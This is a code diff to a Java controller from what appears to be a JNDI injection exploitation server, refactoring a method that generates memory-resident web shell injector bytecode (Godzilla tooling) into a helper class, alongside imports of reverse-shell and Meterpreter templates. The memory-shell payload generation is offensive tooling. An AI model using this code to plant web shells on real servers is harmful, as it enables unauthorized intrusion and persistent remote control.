@@ -1,13 +1,10 @@
 package map.jndi.controller;
 
-import com.reajason.javaweb.memshell.*;
 import com.reajason.javaweb.memshell.config.GenerateResult;
-import com.reajason.javaweb.memshell.config.GodzillaConfig;
-import com.reajason.javaweb.memshell.config.InjectorConfig;
-import com.reajason.javaweb.memshell.config.ShellConfig;
 import map.jndi.Main;
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
+import map.jndi.payload.MemShellPayload;
 import map.jndi.server.WebServer;
 import map.jndi.template.Meterpreter;
 import map.jndi.template.ReverseShell;
@@ -127,23 +124,8 @@ public class BasicController implements Controller {
     public byte[] memShell(String server, String tool, String type) {
         System.out.println("[MemShell]: Server: " + server + " Tool: " + tool + " Type: " + type);
 
-        ShellConfig shellConfig = ShellConfig.builder()
-                .server(Server.valueOf(server))
-                .shellTool(ShellTool.valueOf(tool))
-                .shellType(type)
-                .shrink(true)
-                .debug(false)
-                .build();
-        InjectorConfig injectorConfig = InjectorConfig.builder().build();
-        GodzillaConfig godzillaConfig = GodzillaConfig.builder().build();
-        GenerateResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);
-
-        System.out.println();
-        System.out.println("Injector ClassName：" + result.getInjectorClassName());
-        System.out.println("Shell ClassName：" + result.getShellClassName());
-        System.out.println(result.getShellConfig());
-        System.out.println(result.getShellToolConfig());
-        System.out.println();
+        GenerateResult result = MemShellPayload.generate(server, tool, type);
+        MemShellPayload.printInfo(result);
 
         return result.getInjectorBytes();
     }
